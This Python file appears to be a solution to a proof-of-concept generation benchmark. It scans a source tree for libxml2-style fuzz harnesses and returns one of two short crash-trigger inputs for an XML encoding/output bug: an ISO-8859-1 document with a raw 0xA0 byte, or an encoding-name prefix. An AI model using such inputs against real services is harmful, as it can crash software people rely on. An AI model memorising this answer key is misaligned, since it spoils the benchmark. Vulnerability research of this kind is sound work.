import os
import tarfile
from typing import Iterable, Tuple, Optional


class Solution:
    def _iter_candidate_source_files(self, src_path: str) -> Iterable[Tuple[str, bytes]]:
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    lfn = fn.lower()
                    if not (lfn.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp"))):
                        continue
                    rel = os.path.relpath(os.path.join(root, fn), src_path).replace(os.sep, "/")
                    lrel = rel.lower()
                    if ("fuzz" not in lrel) and ("oss-fuzz" not in lrel) and ("fuzzer" not in lrel):
                        continue
                    path = os.path.join(root, fn)
                    try:
                        with open(path, "rb") as f:
                            data = f.read()
                        yield rel, data
                    except OSError:
                        continue
            return

        try:
            tf = tarfile.open(src_path, "r:*")
        except tarfile.TarError:
            return

        with tf:
            for m in tf.getmembers():
                if not m.isreg():
                    continue
                name = (m.name or "").replace("\\", "/")
                lname = name.lower()
                if not lname.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp")):
                    continue
                if ("fuzz" not in lname) and ("oss-fuzz" not in lname) and ("fuzzer" not in lname):
                    continue
                if m.size <= 0 or m.size > 2_000_000:
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    with f:
                        data = f.read()
                    yield name, data
                except Exception:
                    continue

    def _detect_harness_mode(self, src_path: str) -> str:
        xml_parse = False
        output_buf = False
        uses_data_as_encoding = False
        has_fuzzer_entry = False

        for _, data in self._iter_candidate_source_files(src_path):
            if b"LLVMFuzzerTestOneInput" in data or b"FuzzerTestOneInput" in data:
                has_fuzzer_entry = True

            if (
                b"xmlReadMemory" in data
                or b"xmlParseMemory" in data
                or b"xmlReaderForMemory" in data
                or b"htmlReadMemory" in data
                or b"xmlCtxtReadMemory" in data
            ):
                xml_parse = True

            if (
                b"xmlAllocOutputBuffer" in data
                or b"xmlOutputBufferCreate" in data
                or b"xmlSaveTo" in data
                or b"xmlDocDumpMemory" in data
            ):
                output_buf = True

            if b"xmlFindCharEncodingHandler" in data and (b"(const char *)data" in data or b"(char *)data" in data):
                uses_data_as_encoding = True

            if has_fuzzer_entry and xml_parse and output_buf and not uses_data_as_encoding:
                return "xml"

            if has_fuzzer_entry and uses_data_as_encoding and output_buf and not xml_parse:
                return "encoding_prefix"

        if xml_parse and output_buf:
            return "xml"
        if uses_data_as_encoding and output_buf:
            return "encoding_prefix"
        return "xml"

    def _poc_xml(self) -> bytes:
        return b'<?xml version="1.0" encoding="ISO-8859-1"?><a>\xa0</a>'

    def _poc_encoding_prefix(self) -> bytes:
        return b"ISO-8859-1\x00A"

    def solve(self, src_path: str) -> bytes:
        mode = self._detect_harness_mode(src_path)
        if mode == "encoding_prefix":
            return self._poc_encoding_prefix()
        return self._poc_xml()